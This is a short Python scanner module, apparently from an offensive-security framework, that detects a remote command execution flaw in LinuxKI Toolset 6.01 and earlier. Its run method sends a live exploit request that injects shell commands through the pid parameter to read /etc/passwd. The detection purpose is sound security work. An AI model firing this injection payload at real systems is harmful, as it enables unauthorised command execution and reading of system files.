...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LinuxKI Toolset <= 6.01 - Remote Command Execution Detection',
        'description': 'LinuxKI v6.0-1 and earlier are vulnerable to remote code execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rce', 'packetstorm', 'hp', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/linuxki/experimental/vis/kivis.php?type=kitrace&pid=0;echo%20START;cat%20/etc/passwd;echo%20END;', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="LinuxKI Toolset <= 6.01 - Remote Command Execution detected",
